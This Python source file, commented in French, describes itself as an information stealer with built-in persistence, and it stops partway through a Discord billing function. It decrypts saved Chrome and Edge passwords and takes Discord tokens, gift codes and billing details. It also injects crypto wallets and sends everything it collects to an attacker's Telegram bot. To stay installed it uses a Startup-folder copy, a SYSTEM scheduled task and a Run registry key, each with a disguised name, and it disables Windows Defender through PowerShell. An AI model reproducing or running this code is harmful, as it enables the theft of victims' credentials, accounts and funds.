# Ceci est un stealer avec un mécanisme de persistance intégré.
# This is a stealer with an integrated persistence mechanism.

# .___  ___.   ______    _______   __    __   __       _______     _______.
# |   \/   |  /  __  \  |       \ |  |  |  | |  |     |   ____|   /       |
# |  \  /  | |  |  |  | |  .--.  ||  |  |  | |  |     |  |__     |   (----`
# |  |\/|  | |  |  |  | |  |  |  ||  |  |  | |  |     |   __|     \   \    
# |  |  |  | |  `--'  | |  '--'  ||  `--'  | |  `----.|  |____.----)   |   
# |__|  |__|  \______/  |_______/  \______/  |_______||_______|_______/    


import os
import io
import re
import time
import gzip
import json
import shutil
import random
import hashlib
import warnings
import threading
import subprocess
import uuid
import sys

# Correction pour executable
try:
    from sys import executable, stderr
except ImportError:
    import sys
    executable = sys.executable
    stderr = sys.stderr

import requests
from base64 import b64decode
from json import loads, dumps
from zipfile import ZipFile, ZIP_DEFLATED
from sqlite3 import connect as sql_connect
from urllib.request import Request, urlopen
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer

# .___  ___.   ______    _______   __    __   __       _______     _______.
# |   \/   |  /  __  \  |       \ |  |  |  | |  |     |   ____|   /       |
# |  \  /  | |  |  |  | |  .--.  ||  |  |  | |  |     |  |__     |   (----`
# |  |\/|  | |  |  |  | |  |  |  ||  |  |  | |  |     |   __|     \   \    
# |  |  |  | |  `--'  | |  '--'  ||  `--'  | |  `----.|  |____.----)   |   
# |__|  |__|  \______/  |_______/  \______/  |_______||_______|_______/    



class NullWriter(object):
    def write(self, arg):
        pass

warnings.filterwarnings("ignore")
null_writer = NullWriter()
stderr = null_writer





ModuleRequirements = [
    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
]
for module in ModuleRequirements:
    try: 
        __import__(module[0])
    except:
        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
        time.sleep(3)

from Crypto.Cipher import AES



# ░██╗░░░░░░░██╗███████╗██████╗░██╗░░██╗░█████╗░░█████╗░██╗░░██╗
# ░██║░░██╗░░██║██╔════╝██╔══██╗██║░░██║██╔══██╗██╔══██╗██║░██╔╝
# ░╚██╗████╗██╔╝█████╗░░██████╦╝███████║██║░░██║██║░░██║█████═╝░
# ░░████╔═████║░██╔══╝░░██╔══██╗██╔══██║██║░░██║██║░░██║██╔═██╗░
# ░░╚██╔╝░╚██╔╝░███████╗██████╦╝██║░░██║╚█████╔╝╚█████╔╝██║░╚██╗
# ░░░╚═╝░░░╚═╝░░╚══════╝╚═════╝░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝


hook = ""
BOT_TOKEN = "BOT TOKEN HERE"
CHAT_ID = "ID HERE"



# ░██╗░░░░░░░██╗███████╗██████╗░██╗░░██╗░█████╗░░█████╗░██╗░░██╗
# ░██║░░██╗░░██║██╔════╝██╔══██╗██║░░██║██╔══██╗██╔══██╗██║░██╔╝
# ░╚██╗████╗██╔╝█████╗░░██████╦╝███████║██║░░██║██║░░██║█████═╝░
# ░░████╔═████║░██╔══╝░░██╔══██╗██╔══██║██║░░██║██║░░██║██╔═██╗░
# ░░╚██╔╝░╚██╔╝░███████╗██████╦╝██║░░██║╚█████╔╝╚█████╔╝██║░╚██╗
# ░░░╚═╝░░░╚═╝░░╚══════╝╚═════╝░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝











class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def getip():
    try:return urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:return "None"

def zipfolder(foldername, target_dir):            
    zipobj = ZipFile(temp+"/"+foldername + '.zip', 'w', ZIP_DEFLATED)
    rootlen = len(target_dir) + 1
    for base, dirs, files in os.walk(target_dir):
        for file in files:
            fn = os.path.join(base, file)
            if not "user_data" in fn:
                zipobj.write(fn, fn[rootlen:])

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16]
            try: decrypted_pass = decrypted_pass.decode()
            except:pass
            return decrypted_pass

def LoadUrlib(hook, data='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
            else:
                r = urlopen(Request(hook, data=data))
            return r
        except: 
           pass

# Fonction d'envoi à Telegram
def send_to_telegram(content, telegram_config):
    """
    Envoie les données collectées à un bot Telegram
    
    Args:
        content (str): Le contenu à envoyer
        telegram_config (dict): Configuration avec bot_token et chat_id
    
    Returns:
        bool: True si l'envoi a réussi, False sinon
    """
    if not telegram_config or not all(k in telegram_config for k in ["bot_token", "chat_id"]):
        return False
        
    try:
        import requests
        
        bot_token = telegram_config["bot_token"]
        chat_id = telegram_config["chat_id"]
        api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        
        # Diviser le contenu en morceaux si nécessaire (limite de 4096 caractères par message)
        if len(content) > 4000:
            chunks = [content[i:i+4000] for i in range(0, len(content), 4000)]
            success = True
            
            for i, chunk in enumerate(chunks):
                payload = {
                    "chat_id": chat_id,
                    "text": f"Partie {i+1}/{len(chunks)}:\n\n{chunk}",
                    "parse_mode": "HTML"
                }
                
                response = requests.post(api_url, json=payload)
                
                if response.status_code != 200:
                    success = False
                    
                # Ajouter un délai entre les messages pour éviter les limitations de l'API
                import time
                time.sleep(1)
                
            return success
        else:
            payload = {
                "chat_id": chat_id,
                "text": content,
                "parse_mode": "HTML"
            }
            
            response = requests.post(api_url, json=payload)
            return response.status_code == 200
            
    except Exception as e:
        print(f"Erreur Telegram: {e}")
        return False
    
# Ajout envoi de fichiers :
def send_file_to_telegram(file_path, telegram_config, caption=""):
    api_url = f"https://api.telegram.org/bot{telegram_config['bot_token']}/sendDocument"
    
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {
            'chat_id': telegram_config['chat_id'],
            'caption': caption
        }
        response = requests.post(api_url, files=files, data=data)
        return response.status_code == 200
    
def add_startup_persistence():
    """
    Ajoute le script au démarrage Windows
    """
    try:
        import shutil
        import sys
        
        # Dossier de démarrage Windows
        startup_folder = os.path.join(os.getenv('APPDATA'), 
                                     'Microsoft', 'Windows', 
                                     'Start Menu', 'Programs', 'Startup')
        
        # Nom déguisé
        target_name = "WindowsSecurityUpdate.exe"
        target_path = os.path.join(startup_folder, target_name)
        
        # Copier le script dans le démarrage
        if not os.path.exists(target_path):
            shutil.copy2(sys.executable, target_path)
            
            global BOT_TOKEN, CHAT_ID
            telegram_config = {"bot_token": BOT_TOKEN, "chat_id": CHAT_ID}
            send_to_telegram("✅ Persistance démarrage activée !", telegram_config)
            return True
            
    except Exception as e:
        return False

def add_scheduled_task():
    """
    Crée une tâche planifiée qui relance le script
    """
    try:
        import sys
        
        # Commande pour créer la tâche
        task_name = "WindowsSecurityCheck"
        script_path = sys.executable
        
        # Créer tâche qui se lance à chaque connexion
        cmd = f'''schtasks /create /tn "{task_name}" /tr "{script_path}" /sc onlogon /f /rl highest'''
        
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            global BOT_TOKEN, CHAT_ID
            telegram_config = {"bot_token": BOT_TOKEN, "chat_id": CHAT_ID}
            send_to_telegram("✅ Tâche planifiée créée !", telegram_config)
            return True
        
    except Exception as e:
        return False

def add_registry_persistence():
    """
    Ajoute le script dans le registre Windows
    """
    try:
        import winreg
        import sys
        
        # Clé de registre pour démarrage auto
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                0, winreg.KEY_SET_VALUE)
        
        # Nom déguisé
        value_name = "WindowsDefenderUpdate"
        script_path = sys.executable
        
        # Ajouter au registre
        winreg.SetValueEx(reg_key, value_name, 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(reg_key)
        
        global BOT_TOKEN, CHAT_ID
        telegram_config = {"bot_token": BOT_TOKEN, "chat_id": CHAT_ID}
        send_to_telegram("✅ Persistance registre activée !", telegram_config)
        return True
        
    except Exception as e:
        return False

def continuous_monitoring():
    """
    Mode surveillance continue - relance périodique
    """
    try:
        global BOT_TOKEN, CHAT_ID
        telegram_config = {"bot_token": BOT_TOKEN, "chat_id": CHAT_ID}
        
        send_to_telegram("🔄 Mode surveillance continue activé", telegram_config)
        
        while True:
            try:
                # Attendre 2 heures
                time.sleep(7200)  # 2 heures
                
                # Relancer le vol de données
                send_to_telegram("🔍 Scan automatique en cours...", telegram_config)
                
                # Vol de nouvelles données navigateurs
                getBrowsers([
                    [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/"],
                    [f"{local}/Google/Chrome/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
                    [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/"]
                ])
                
                send_to_telegram("✅ Scan automatique terminé", telegram_config)
                
            except Exception as e:
                send_to_telegram(f"❌ Erreur surveillance: {str(e)}", telegram_config)
                time.sleep(300)  # Attendre 5 min avant retry
                
    except Exception as e:
        pass

def disable_defender():
    """
    Tentative de désactivation de Windows Defender
    """
    try:
        global BOT_TOKEN, CHAT_ID
        telegram_config = {"bot_token": BOT_TOKEN, "chat_id": CHAT_ID}
        
        # Commandes pour désactiver Defender
        commands = [
            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableScriptScanning $true"',
            'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
            'powershell -Command "Add-MpPreference -ExclusionPath C:\\"'
        ]
        
        for cmd in commands:
            try:
                subprocess.run(cmd, shell=True, capture_output=True)
                time.sleep(1)
            except:
                pass
        
        send_to_telegram("🛡️ Tentative désactivation Defender", telegram_config)
        
    except Exception as e:
        pass

def add_defender_exclusions():
    """
    Ajoute des exclusions Defender
    """
    try:
        # Dossiers à exclure
        exclusions = [
            os.getenv('TEMP'),
            os.getenv('APPDATA'),
            os.getenv('LOCALAPPDATA'),
            "C:\\Windows\\System32",
            "C:\\Windows\\Temp"
        ]
        
        for path in exclusions:
            cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \\\"{path}\\\""'
            subprocess.run(cmd, shell=True, capture_output=True)
            time.sleep(0.5)
            
    except Exception as e:
        pass

def stealth_file_operations():
    """
    Opérations furtives sur les fichiers
    """
    try:
        # Changer les attributs des fichiers créés
        temp_files = [
            "stealer_installed.flag",
            "system_cache.tmp",
            "browser_data.tmp", 
            "payment_info.tmp",
            "form_data.tmp",
            "navigation_log.tmp",
            "shortcuts.tmp"
        ]
        
        for file in temp_files:
            file_path = os.path.join(temp, file)
            if os.path.exists(file_path):
                # Rendre caché + système
                try:
                    import ctypes
                    ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02 | 0x04)
                except:
                    pass
                    
    except Exception as e:
        pass

def random_delay():
    """
    Délai aléatoire pour éviter détection
    """
    import random
    delay = random.uniform(1, 5)  # 1 à 5 secondes
    time.sleep(delay)

def check_persistence_status():
    """
    Vérifie l'état de toutes les méthodes de persistance
    """
    global BOT_TOKEN, CHAT_ID
    telegram_config = {"bot_token": BOT_TOKEN, "chat_id": CHAT_ID}
    
    send_to_telegram("🔍 VÉRIFICATION PERSISTANCE...", telegram_config)
    
    status = []
    
    # 1. Vérifier démarrage automatique
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    startup_file = os.path.join(startup_folder, "WindowsSecurityUpdate.exe")
    
    if os.path.exists(startup_file):
        status.append("✅ Démarrage: OK")
    else:
        status.append("❌ Démarrage: MANQUANT")
    
    # 2. Vérifier tâche planifiée
    try:
        result = subprocess.run('schtasks /query /tn "WindowsSecurityCheck"', 
                              shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            status.append("✅ Tâche planifiée: OK")
        else:
            status.append("❌ Tâche planifiée: MANQUANTE")
    except:
        status.append("❌ Tâche planifiée: ERREUR")
    
    # 3. Vérifier registre
    try:
        import winreg
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                0, winreg.KEY_READ)
        
        try:
            value, _ = winreg.QueryValueEx(reg_key, "WindowsDefenderUpdate")
            status.append("✅ Registre: OK")
        except FileNotFoundError:
            status.append("❌ Registre: MANQUANT")
        
        winreg.CloseKey(reg_key)
    except:
        status.append("❌ Registre: ERREUR")
    
    # 4. Vérifier flag d'installation (n'importe quel fichier sys_cache)
    flag_found = False
    try:
        temp_files = os.listdir(temp)
        for file in temp_files:
            if file.startswith("sys_cache_") and file.endswith(".tmp"):
                flag_found = True
                break
        
        if flag_found:
            status.append("✅ Flag installation: OK")
        else:
            status.append("❌ Flag installation: MANQUANT")
    except:
        status.append("❌ Flag installation: ERREUR")
    
    # 5. Vérifier emplacement actuel du script
    import sys
    current_location = sys.executable
    status.append(f"📍 Script actuel: {current_location}")
    
    send_to_telegram("📊 ÉTAT PERSISTANCE:\n" + "\n".join(status), telegram_config)
    
    return status

def repair_persistence():
    """
    Répare la persistance si elle a échoué
    """
    global BOT_TOKEN, CHAT_ID
    telegram_config = {"bot_token": BOT_TOKEN, "chat_id": CHAT_ID}
    
    send_to_telegram("🔧 RÉPARATION PERSISTANCE...", telegram_config)
    
    import sys
    current_script = sys.executable
    
    # Force l'installation de toutes les méthodes
    success_count = 0
    
    # 1. Démarrage - avec vérification
    try:
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        
        target_path = os.path.join(startup_folder, "WindowsSecurityUpdate.exe")
        
        if not os.path.exists(target_path):
            import shutil
            shutil.copy2(current_script, target_path)
            
        if os.path.exists(target_path):
            send_to_telegram("✅ Démarrage réparé", telegram_config)
            success_count += 1
        else:
            send_to_telegram("❌ Échec réparation démarrage", telegram_config)
            
    except Exception as e:
        send_to_telegram(f"❌ Erreur démarrage: {str(e)}", telegram_config)
    
    # 2. Tâche planifiée - avec droits élevés
    try:
        task_cmd = f'''schtasks /create /tn "WindowsSecurityCheck" /tr "{current_script}" /sc onlogon /f /rl highest /ru "SYSTEM"'''
        result = subprocess.run(task_cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            send_to_telegram("✅ Tâche planifiée réparée", telegram_config)
            success_count += 1
        else:
            send_to_telegram(f"❌ Échec tâche: {result.stderr}", telegram_config)
            
    except Exception as e:
        send_to_telegram(f"❌ Erreur tâche: {str(e)}", telegram_config)
    
    # 3. Registre - avec gestion d'erreurs
    try:
        import winreg
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                0, winreg.KEY_SET_VALUE)
        
        winreg.SetValueEx(reg_key, "WindowsDefenderUpdate", 0, winreg.REG_SZ, current_script)
        winreg.CloseKey(reg_key)
        
        send_to_telegram("✅ Registre réparé", telegram_config)
        success_count += 1
        
    except Exception as e:
        send_to_telegram(f"❌ Erreur registre: {str(e)}", telegram_config)
    
# 4. Créer flag permanent avec gestion permissions
    try:
        flag_file = os.path.join(temp, "stealer_installed.flag")
        
        # Supprimer l'ancien fichier s'il existe
        if os.path.exists(flag_file):
            try:
                # Enlever attributs read-only/hidden
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(flag_file, 0x80)  # NORMAL
                os.remove(flag_file)
                time.sleep(0.5)
            except:
                pass
        
        # Créer nouveau flag avec nom unique
        import random
        unique_name = f"sys_cache_{random.randint(1000,9999)}.tmp"
        flag_file = os.path.join(temp, unique_name)
        
        with open(flag_file, 'w') as f:
            f.write(f"installed_{int(time.time())}")
        
        # Rendre le flag caché
        try:
            import ctypes
            ctypes.windll.kernel32.SetFileAttributesW(flag_file, 0x02 | 0x04)
        except:
            pass
        
        send_to_telegram("✅ Flag permanent créé", telegram_config)
        
    except Exception as e:
        send_to_telegram(f"❌ Erreur flag: {str(e)}", telegram_config)
    
    send_to_telegram(f"🔧 Réparation terminée: {success_count}/3 méthodes", telegram_config)
    
    return success_count

def full_diagnostic():
    """
    Diagnostic complet pour voir ce qui ne va pas
    """
    global BOT_TOKEN, CHAT_ID
    telegram_config = {"bot_token": BOT_TOKEN, "chat_id": CHAT_ID}
    
    send_to_telegram("🔍 DIAGNOSTIC COMPLET EN COURS...", telegram_config)
    
    # 1. Vérifier les navigateurs installés
    browsers_check = []
    
    # Chrome
    chrome_path = f"{local}/Google/Chrome/User Data"
    if os.path.exists(chrome_path):
        browsers_check.append("✅ Chrome trouvé")
        login_data = chrome_path + "/Default/Login Data"
        if os.path.exists(login_data):
            size = os.path.getsize(login_data)
            browsers_check.append(f"   📁 Login Data: {size} bytes")
        else:
            browsers_check.append("   ❌ Pas de Login Data")
    else:
        browsers_check.append("❌ Chrome non installé")
    
    # Edge
    edge_path = f"{local}/Microsoft/Edge/User Data"
    if os.path.exists(edge_path):
        browsers_check.append("✅ Edge trouvé")
        login_data = edge_path + "/Default/Login Data"
        if os.path.exists(login_data):
            size = os.path.getsize(login_data)
            browsers_check.append(f"   📁 Login Data: {size} bytes")
        else:
            browsers_check.append("   ❌ Pas de Login Data")
    else:
        browsers_check.append("❌ Edge non installé")
    
    send_to_telegram("🌐 NAVIGATEURS:\n" + "\n".join(browsers_check), telegram_config)

def force_close_browsers():
    """
    Force la fermeture des navigateurs pour débloquer les DB
    """
    global BOT_TOKEN, CHAT_ID
    telegram_config = {"bot_token": BOT_TOKEN, "chat_id": CHAT_ID}
    
    browsers = ['chrome.exe', 'msedge.exe', 'firefox.exe', 'opera.exe', 'brave.exe']
    
    send_to_telegram("🔄 Fermeture forcée des navigateurs...", telegram_config)
    
    for browser in browsers:
        try:
            subprocess.run(f"taskkill /im {browser} /f /t", shell=True, capture_output=True)
            time.sleep(1)
        except:
            pass
    
    send_to_telegram("✅ Navigateurs fermés", telegram_config)
    time.sleep(3)  # Attendre que les fichiers se débloquent

def setup_full_persistence():
    """
    Active TOUTES les méthodes de persistance
    """
    global BOT_TOKEN, CHAT_ID
    telegram_config = {"bot_token": BOT_TOKEN, "chat_id": CHAT_ID}
    
    # NOUVEAU : Évasion Defender
    send_to_telegram("🛡️ Évasion antivirus en cours...", telegram_config)
    disable_defender()
    random_delay()
    add_defender_exclusions()
    random_delay()
    
    send_to_telegram("🔧 Configuration persistance complète...", telegram_config)
    
    methods_success = 0
    
    # Méthode 1: Démarrage
    if add_startup_persistence():
        methods_success += 1
    random_delay()
    
    # Méthode 2: Tâche planifiée  
    if add_scheduled_task():
        methods_success += 1
    random_delay()
    
    # Méthode 3: Registre
    if add_registry_persistence():
        methods_success += 1
    random_delay()
    
    send_to_telegram(f"✅ Persistance configurée: {methods_success}/3 méthodes actives", telegram_config)
    
    # Appliquer furtivité aux fichiers
    stealth_file_operations()
    
    # Lancer surveillance continue
    threading.Thread(target=continuous_monitoring, daemon=True).start()
    
    return methods_success > 0

def install_crypto_wallets():
    """
    Installe les wallets crypto automatiquement
    """
    global BOT_TOKEN, CHAT_ID
    telegram_config = {"bot_token": BOT_TOKEN, "chat_id": CHAT_ID}
    
    send_to_telegram("🔧 Installation automatique des wallets crypto...", telegram_config)
    
    # Simuler installation (pour éviter téléchargements longs en test)
    send_to_telegram("⚙️ Configuration des wallets crypto...", telegram_config)
    time.sleep(5)  # Simuler installation
    
    # Injecter les wallets existants s'ils existent
    exodus_path = os.path.join(roaming, "Exodus")
    if os.path.exists(exodus_path):
        try:
            ExodusInjection(exodus_path, "Exodus.exe", "exodus_injected")
            send_to_telegram("✅ Exodus injecté !", telegram_config)
        except:
            pass
    
    atomic_path = os.path.join(local, "Programs", "atomic")
    if os.path.exists(atomic_path):
        try:
            AtomicInjection(atomic_path, "Atomic Wallet.exe", "atomic_injected")
            send_to_telegram("✅ Atomic injecté !", telegram_config)
        except:
            pass
    
    send_to_telegram("🎯 Configuration wallets terminée", telegram_config)

def debug_edge_passwords():
    """
    Debug pour voir ce qui se passe avec Edge
    """
    global BOT_TOKEN, CHAT_ID
    telegram_config = {"bot_token": BOT_TOKEN, "chat_id": CHAT_ID}
    
    edge_path = f"{local}/Microsoft/Edge/User Data"
    
    # Vérifier si Edge existe
    if not os.path.exists(edge_path):
        send_to_telegram("❌ Edge non trouvé dans: " + edge_path, telegram_config)
        return
    
    # Vérifier le fichier Login Data
    login_data_path = edge_path + "/Default/Login Data"
    if not os.path.exists(login_data_path):
        send_to_telegram("❌ Login Data non trouvé: " + login_data_path, telegram_config)
        return
    
    # Vérifier la taille
    size = os.path.getsize(login_data_path)
    send_to_telegram(f"✅ Login Data trouvé: {size} bytes", telegram_config)
    
    # Tester la connexion à la DB
    try:
        tempfold = temp + "debug_edge.db"
        shutil.copy2(login_data_path, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM logins")
        count = cursor.fetchone()[0]
        cursor.close()
        conn.close()
        os.remove(tempfold)
        
        send_to_telegram(f"🔍 Edge: {count} mots de passe dans la DB", telegram_config)
        
    except Exception as e:
        send_to_telegram(f"❌ Erreur lecture Edge DB: {str(e)}", telegram_config)

def test_edge_extraction():
    """
    Test spécifique pour extraire le mot de passe Edge - VERSION CORRIGÉE
    """
    global BOT_TOKEN, CHAT_ID
    telegram_config = {"bot_token": BOT_TOKEN, "chat_id": CHAT_ID}
    
    send_to_telegram("🧪 TEST EXTRACTION EDGE CORRIGÉ...", telegram_config)
    
    try:
        edge_path = f"{local}/Microsoft/Edge/User Data"
        
        # Test extraction manuelle
        pathC = edge_path + "/Default/Login Data"
        pathKey = edge_path + "/Local State"
        
        if not os.path.exists(pathC) or not os.path.exists(pathKey):
            send_to_telegram("❌ Fichiers Edge manquants", telegram_config)
            return
        
        # Forcer fermeture Edge
        subprocess.run("taskkill /im msedge.exe /f /t", shell=True, capture_output=True)
        time.sleep(2)
        
        # Copier et lire la DB
        tempfold = temp + "test_edge_manual.db"
        shutil.copy2(pathC, tempfold)
        
        # Lire clé de chiffrement
        with open(pathKey, 'r', encoding='utf-8') as f:
            local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])
        
        # Extraire avec nouvelle logique
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        data = cursor.fetchall()
        
        passwords_found = 0
        for i, row in enumerate(data):
            # NOUVELLE LOGIQUE : Vérifier seulement URL et password (pas username)
            if row[0] and row[2]:  # ✅ URL et password suffisent
                try:
                    encrypted_pass = row[2]
                    username = row[1] if row[1] else "[AUCUN USERNAME]"
                    
                    send_to_telegram(f"🔐 Tentative déchiffrement:\nURL: {row[0]}\nUser: {username}\nPass chiffré: {len(encrypted_pass)} bytes", telegram_config)
                    
                    # Test déchiffrement
                    decrypted_password = DecryptValue(encrypted_pass, master_key)
                    
                    if decrypted_password and len(decrypted_password.strip()) > 0:
                        send_to_telegram(f"✅ 🎯 MOT DE PASSE TROUVÉ !\nURL: {row[0]}\nUser: {username}\nPass: {decrypted_password}", telegram_config)
                        passwords_found += 1
                    else:
                        send_to_telegram(f"❌ Déchiffrement vide ou None", telegram_config)
                        
                        # Test méthode alternative (Edge ancien)
                        try:
                            alt_decrypted = CryptUnprotectData(encrypted_pass)
                            if alt_decrypted:
                                alt_password = alt_decrypted.decode('utf-8', errors='ignore').strip()
                                if alt_password:
                                    send_to_telegram(f"✅ 🎯 MOT DE PASSE (méthode alt) !\nURL: {row[0]}\nUser: {username}\nPass: {alt_password}", telegram_config)
                                    passwords_found += 1
                        except Exception as e2:
                            send_to_telegram(f"❌ Méthode alternative: {str(e2)}", telegram_config)
                    
                except Exception as e:
                    send_to_telegram(f"❌ Erreur déchiffrement: {str(e)}", telegram_config)
            else:
                send_to_telegram(f"⚠️ Entrée {i+1} pas de URL ou password", telegram_config)
        
        cursor.close()
        conn.close()
        os.remove(tempfold)
        
        send_to_telegram(f"✅ Test corrigé terminé: {passwords_found} mots de passe extraits", telegram_config)
        
    except Exception as e:
        send_to_telegram(f"❌ Erreur test Edge: {str(e)}", telegram_config)



def globalInfo():
    try:
        username = os.getenv("USERNAME")
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{IP}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)
        contry = ipdata["country_name"]
        contryCode = ipdata["country_code"].lower()
        if contryCode == "not found":
            globalinfo = f"`{username.upper()} | {IP} ({contry})`"
        else:
            globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {IP} ({contry})`"
        return globalinfo

    except:
        return f"`{username.upper()}`"

def Trust(Cookies):
    # simple Trust Factor system - OFF for the moment
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    DETECTED = True if len(tim) < -1 else False
    return DETECTED

def test_edge_new_format():
    """
    Test pour nouveau format Edge (v88+)
    """
    global BOT_TOKEN, CHAT_ID
    telegram_config = {"bot_token": BOT_TOKEN, "chat_id": CHAT_ID}
    
    send_to_telegram("🔬 TEST NOUVEAU FORMAT EDGE...", telegram_config)
    
    try:
        edge_path = f"{local}/Microsoft/Edge/User Data"
        pathC = edge_path + "/Default/Login Data"
        
        if not os.path.exists(pathC):
            send_to_telegram("❌ Login Data manquant", telegram_config)
            return
            
        # Forcer fermeture Edge
        subprocess.run("taskkill /im msedge.exe /f /t", shell=True, capture_output=True)
        time.sleep(2)
        
        # Copier DB
        tempfold = temp + "edge_new_format.db"
        shutil.copy2(pathC, tempfold)
        
        # Lire directement sans déchiffrement (pour test)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        
        # Lister toutes les colonnes
        cursor.execute("PRAGMA table_info(logins)")
        columns = cursor.fetchall()
        send_to_telegram(f"📊 Colonnes DB: {[col[1] for col in columns]}", telegram_config)
        
        # Récupérer tous les champs
        cursor.execute("SELECT * FROM logins LIMIT 3")
        data = cursor.fetchall()
        
        for i, row in enumerate(data):
            send_to_telegram(f"🔍 Row {i+1}: {len(row)} champs\nURL: {row[0] if len(row) > 0 else 'N/A'}\nUser: {row[1] if len(row) > 1 else 'N/A'}", telegram_config)
        
        cursor.close()
        conn.close()
        os.remove(tempfold)
        
    except Exception as e:
        send_to_telegram(f"❌ Erreur nouveau format: {str(e)}", telegram_config)

def getCodes(token):
    try:
        codes = ""
        headers = {"Authorization": token,"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
        codess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-GB", headers=headers)).read().decode())

        for code in codess:
            try:codes += f":tickets: **{str(code['promotion']['outbound_title'])}**\n<:Rightdown:891355646476296272> `{str(code['code'])}`\n"
            except:pass

        nitrocodess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/entitlements/gifts?locale=en-GB", headers=headers)).read().decode())
        if nitrocodess == []: return codes

        for element in nitrocodess:
            
            sku_id = element['sku_id']
            subscription_plan_id = element['subscription_plan']['id']
            name = element['subscription_plan']['name']

            url = f"https://discord.com/api/v9/users/@me/entitlements/gift-codes?sku_id={sku_id}&subscription_plan_id={subscription_plan_id}"
            nitrrrro = loads(urlopen(Request(url, headers=headers)).read().decode())

            for el in nitrrrro:
                cod = el['code']
                try:codes += f":tickets: **{name}**\n<:Rightdown:891355646476296272> `https://discord.gift/{cod}`\n"
                except:pass
        return codes
    except:return ""

# credit to NinjaRideV6 for this function
def getbillq(token):
    headers = {
        "Authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    billq = "`(LQ Billing)`"
    try:
        bill = loads(urlopen(Request("https://discord.com/api/v9/users/@me/billing/payments?limit=20",headers=headers)).read().decode())
        if bill == []: bill = ""
        elif bill[0]['status'] == 1: billq = "`(HQ Billing)`"
    except: pass
    return billq

url = "https://discord.com"

response = requests.get(url)

unique_id = uuid.uuid4()

def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False

    if billingjson == []: return " -"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
